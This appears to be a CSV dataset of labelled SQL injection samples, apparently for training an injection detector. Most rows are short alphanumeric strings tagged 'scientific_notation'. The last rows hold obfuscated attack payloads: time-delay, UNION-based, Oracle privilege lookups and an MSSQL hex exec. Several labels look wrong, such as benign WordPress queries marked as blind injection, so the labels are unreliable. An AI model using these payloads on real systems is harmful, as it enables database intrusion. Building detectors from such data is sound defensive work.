payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
tu6e3a5a,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
de78e24423n6e,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
8e35o502da7,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
5a4a84e8a,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
ar2e5tad6,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
agujer4e2o,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
9e1an906,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
sim5e469,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
81e9604o6o,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
7uo09e5a1,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
24n1e39,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
7e2hered0962n,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
4s2cu8e44,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
r4a8e3a,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
o1e6e2d6,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
l9n0e7no,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
r92e1*56e,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
obed9e3cia0,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
1pa5364e3a,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
6i4t562e7a,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
6e665a,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
carr3e0,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
tro8e0e1!0,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
20e28u6r,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
13g0e7at42a,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
con10e4t2,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
cr48e24n,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
2446e8t6da,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
8e6a74aer,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
p5li8e5i2,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
6e1ba,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
07u8e37ia,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
v2e2udo,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
c2nve3e213a,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
4e6qu5r5r,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
esc2n3alosa5e4te,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
a2o2e5,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
6e0turer2,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
1e1ador,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
he53e9ona,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
2e64n8m5,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
mo3e5e5o,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
bo722e6.8,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
8e3i2ar,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
4e7cr0b37,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
0e8v88e,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
3-e1e5rur3,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
ac4e4865r,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
sed4e748,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
29p0r2en9e7c87,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
5e3i2a4,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
c1s92be4e29,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
e6749l178e3a,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
3e43a01n8,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
9e3ed330a,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
er3t3e1,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
50sc2e3i6i1172,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
embel1e542,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
5e56ir2,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
a6e7i519374n,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
f536e6a,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
c48mari1e5a,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
inord2n6da7e401,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
00nd11e0,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
9e6e3illa,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
6e933ci39lo,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
g8629e8d9r,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
63ep6240e50o,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
c594h6e5,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
5e938rera,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
p8e8079zu58o,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
4e03+17a9a,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
c4e32788ia,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
c3er2e4ue15,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
c1ir4ia4e5a,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
7m63e31r,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
014e35,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
a25e7e,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
2e0814r1pada,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
01e9$6d5l7,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
con2e5u934e1215e,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
4l6ad1e14,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
a55r4e1a,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
en2re7e4hu16,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
1e9.l62r2do6,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
9ein6e0a3,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
f8li48e3,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
1a49e6o301,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
0a31e7a4,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
1es6si47e7t1,unknown,unknown,scientific_notation,0.0,rule,sqliv2_csv,unknown
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type = 'acf-field' AND ( ( wp_posts.post_status = 'publish' ) ) AND wp_posts.post_name = 'field_5f72e0bae01c0' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",boolean_blind,unknown,case_variation|scientific_notation,0.8,rule,sqliv3_csv,string_single_quote
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type = 'acf-field' AND ( ( wp_posts.post_status = 'publish' ) ) AND wp_posts.post_name = 'field_5f6c839e379ee' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",boolean_blind,unknown,case_variation|scientific_notation,0.8,rule,sqliv3_csv,string_single_quote
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type = 'acf-field' AND ( ( wp_posts.post_status = 'publish' ) ) AND wp_posts.post_name = 'field_6102e466912f5' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",boolean_blind,unknown,case_variation|scientific_notation,0.8,rule,sqliv3_csv,string_single_quote
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type = 'acf-field' AND ( ( wp_posts.post_status = 'publish' ) ) AND wp_posts.post_name = 'field_6102e48f912f6' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",boolean_blind,unknown,case_variation|scientific_notation,0.8,rule,sqliv3_csv,string_single_quote
"SELeCT * fROm*UserS&WHeRE Id)_= ;0x0 OR ""0X1]]( "" lIkE 0X0o8 Or (SelEct=(SELeCt (sEleCT 0x4))) like[ 0X0B0B1111101004^ && ?0X9e95 likE 0O0b10011110101110_--+0X0b1{(ymw!O]R",unknown,unknown,case_variation|scientific_notation,0.0,rule,sqliv5_json,unknown
"selEct** FRoM uSers:wHERe Id^$LIKE 0b0X1 OR?"",,"" lIKe }0B0x1 OR-0X0 lIKe 2b10x4 _ `oR] 0x6E3`NOT+In (0b0o0X8E3b10,(sElecT*0b0X0B1011010111),0x9E4).oR;""g"" LIkE] ""g."")oR\FaLSe Or]falSE )Or (SELeCt>2X0) Or.(select 0X8) Or�lse Or(""sa9""$lIkE)""sA8Z""&&TruE aNd TRuE -- 1X7b10*sHAa1lXXwib-$LyI:~0X0O6I;U&ThFi?+",unknown,unknown,case_variation|scientific_notation,0.0,rule,sqliv5_json,in_clause
"SELeCT *""fROM USErs whErE(iD+ LIKe 0B0X0b11e9x0B0O1/Or: @$ ~ ;oR faLse[oR (seLEcT (SeLECT (sElEct (selECT (SELEcT (SelECT 0x0)))))) Or falSe# likE/**/0X1}UNIoN.seLECT""0x4,VERsiOn /**/( ) -- 1n}Ub",union_based,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.8,rule,sqliv5_json,unknown
"SeLeCT * FroM uSers where Id = 0o7x1 or,"" ( /) _"" OR (SElect 0x6) LiKe (sELect (sELeCT (SELECT (SELECT (SELECT (SELECT 1)))))) And 0x1E0b170b NOt'LiKE*7X0o5e1C oR '\' not lIKe '\' oR fALse -- 0O1zu",unknown,unknown,case_variation|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_double_quote
0B0o10 waItfOR DElAy/*TFJaI<bn:zvig~vX{<\\L*/'0X0O0b0O0b101:0x0:4b0x3E8'--,unknown,mssql,comment_whitespace|inline_comment|scientific_notation,0.06,rule,sqliv5_json,string_single_quote
"seleCT * frOm UseRs Where id &= 0B3'oR "" ) ;"" oR 0B1020 = ;(sElECt$(SELect (SeleCT 1))) -- 6E5",unknown,unknown,case_variation|scientific_notation,0.0,rule,sqliv5_json,unknown
"?&& 9O0B2O0B0O05O0B0b0o0b0O0b0o2x0X3e4a?{liKe /**/utl_iNAddR.GeT_HOSt_AdDrEss ^ ( ( ?sELEcT dIsTinct"" ( +graNTEd_rolE/*o*/ ); fROM (%:selECT DiSTiNCT (] GrantEd_rOLE })/*ZD*/ , RoWNUM>as LIMit`frOm[DBA_rOlE_PRivs wherE graNtEe LiKe /**/ SYs.loGiNusEr ) [WHeRE limIt = 5O3B8B1010 ') \) and'i' ;liKe }'i",unknown,oracle,case_variation|comment_whitespace|inline_comment|scientific_notation,0.06,rule,sqliv5_json,unknown
"deCLare @Q>NVarChAR ""|( [200{_)#+&0X730065006C0xfB0o436B8156dF8eD9dF58Dba340fda183d3eAEf0x6e04/ExEc ([<@Q ));*",unknown,unknown,hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"^SeLEcT`* FRom uSeRs wHeRE(Id=(sELeCt (SEleCt (sELecT 0X7))) OR ""^ ( _"" Or:0O0x0X1\ ={""3x5 Or FaLsE AND TRue -- 1B1E9",unknown,unknown,case_variation|scientific_notation,0.0,rule,sqliv5_json,unknown
"AND 0B9b8b0b0b111 lIKE utl_INAdDr.GeT_HOst_AdDresS ( ( SELEct diSTIncT ( usErNaMe /*o?> W%;vwyk\*/) from ( sElecT dIStiNcT (? oR (sELEcT (SelECt (sEleCt (SeLecT (SELeCt 0))))) Or FalSe OR 'q' NOT lIke 'q' oR FALSe[aND 7833 NOt LIKe 0X1e98 oR FalSE OR False#usERNAMe )/*AR+I;>Q l S4 zdISs*/ , ROWNUm as liMiT frOm SYS.aLl_uSErS ) wHeRe LiMIT^ Like 3x7x0 )^ ) \ANd'i' lIKe ['I",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.46,rule,sqliv5_json,unknown
""" ) OR*BenChMark ( *0XA344E6,md5 ( (seLEct (seLecT (SeLEct (SELECT (SELECT 0x1))))) ) ~ )"" oR ""31ING""=""31inG{"" AND (SELECT (SELECT 1))#",time_blind,mysql,case_variation|scientific_notation,0.45,rule,sqliv5_json,string_double_quote
"0X0o5340764151c0x1d265b7b710bf1981b61bdbd8b3e086ef1980ef0O2e00'exeC ("")@q ):",unknown,unknown,hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"<) ;OR*;pg_sleeP$/*0O0b0o0o12E6I^K](doQ*/( __TiMe__ ) && (SELEct (SElEcT (sELecT (selecT 6194))))&lIkE (SeLeCT.(sELeCT_(SEleCT (sELECT*6192)))) aND[0X0X0X0O0x1 Or fALSe And ""g"" nOt liKe;""gT"" Or (SeleCt 0) --",unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"0X1%' \?). /*~z<SEfDdH_ (seLecT (SELect (SELECT (SELECT 37))))*/ ) % unIon,all/**/seLECT nuLl,NulL,NUlL,nULl,NuLl oR fALSE\or 0b11X15E0b10 not ! LIkE\ (selECt*0X0o244C)`oR FALse or FAlsE && 0xabe!IN (0o5275,(SELECT (SELECT (SELECT (SELECT 0xf0a)))),3xabf) AND (SELECT 1) AND}1#L=t",union_based,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.8,rule,sqliv5_json,in_clause
"0O2B5', ( SELECT !( case^wHen/ ](@ 9X0o30E3 lIke (SeleCT (sElECT (Select (sELect;0x2673)))) ) tHeN SleEP(]()=4B520 ): else 0x2510* ( ,SeLECT (SeLeCt 0X0o10D0o15)&frOm INf Or MAtIon_schemA.CHARACter_sETs ) ( eNd^ ;) } )",unknown,mysql,case_variation|hex_string|scientific_notation,0.05,rule,sqliv5_json,unknown
"0O9 () \aND cHaR (,^(seLeCt 8B1121518) ){ oR+ CHaR ( |2X0o2X4d ) or chAR (> (SeLect 0x67) .)! or chaR ( <(SelEct (SeleCT 0X58)) ) =| ReGexp_sUbsTRing (] RePEaT (;=LeFt ( cRYPt_kEY!}(\'char;/*?*/( (seLECt 0x91) ) oR Char ( ;(seLECT (sElecT 0X2a)) Or FALse And TRuE#) +oR : ChAr ( =0o0x6x5B110104 ) ,NuLL{ ) ,0o0o12? ) ,0X8O0O1DcD0O22474 ) ,nULl)>). and: (!((sELEct:(SelECT (sELecT (selecT!0x22de)))) LIkE 5x3X16E1 hkt",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"3' ) ! as RVcH wheRe 0O0o3x0o20E0b111< = :(SElECt (seleCt (selECt (SELeCt (SElEcT (Select (seLECt (SELECT 1863)))))))) OR 0O29302 liKe ;LIke ( 'Abcdefg',uPper ;(; Hex( ( RanDoMBlOb ( (SeLeCT 0X0b1dcdB320)/0b0b0x0x0o4 ) ) . ^ ).? )] OR '~np' LikE '~NP{' aNd tRUE And ""M"" LikE ""M""&&tRUe AnD%3X1 anD TRuE --",time_blind,sqlite,case_variation|function_alternative|scientific_notation,0.47,rule,sqliv5_json,unknown
"1' ) WHere 0x32fF=(SELEcT (SELect (sELeCt (SELect 0xfE3)))) RLike+ ( SElecT }( ?case wHen ( 0b0X0x1e6 =LIkE (SElecT^(SElECT 0x3X1E32))/ ) THeN (SELECT 0O0B1) elsE 0X0X0b1c enD]|<) )} && (SElect (SElecT (sElECt (SEleCT (SELECT 1))))) And 0X0o1 AnD*""P 3H"" NOT liKe """"P 0x0b11Ha"" And TRUe --",unknown,unknown,case_variation|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
